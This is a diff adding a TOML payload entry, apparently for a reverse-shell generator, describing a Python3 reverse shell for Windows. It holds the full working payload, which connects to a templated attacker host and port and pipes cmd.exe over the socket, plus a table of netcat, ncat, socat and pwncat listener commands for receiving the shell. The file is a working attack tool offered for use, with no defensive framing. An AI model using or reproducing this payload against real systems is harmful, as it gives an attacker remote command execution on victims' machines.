@@ -1,0 +1,33 @@
+id = "python3_windows"
+name = "Python3 Windows"
+os = "windows"
+type = "reverse"
+proto = "tcp"
+lang = "python"
+description = "Python3 reverse shell for Windows using threads and subprocess."
+
+payload = "import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{{LHOST}}\",{{LPORT}}))\n\np=subprocess.Popen([\"cmd.exe\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()"
+
+[listeners]
+nc = "nc -lvnp {{LPORT}}"
+nc_freebsd = "nc -lvn {{LPORT}}"
+busybox_nc = "busybox nc -lp {{LPORT}}"
+ncat = "ncat -lvnp {{LPORT}}"
+ncat_exe = "ncat.exe -lvnp {{LPORT}}"
+rlwrap_nc = "rlwrap -cAr nc -lvnp {{LPORT}}"
+rustcat = "rcat listen {{LPORT}}"
+pwncat = "python3 -m pwncat -lp {{LPORT}}"
+socat = "socat -d -d TCP-LISTEN:{{LPORT}} STDOUT"
+socat_tty = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
+
+
+[shells]
+compatible = [
+	"cmd.exe",
+	"powershell.exe",
+	"pwsh.exe",
+	"C:/Windows/System32/cmd.exe",
+	"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe",
+	"C:/Program Files/PowerShell/7/pwsh.exe"
+]
+default = "cmd.exe"
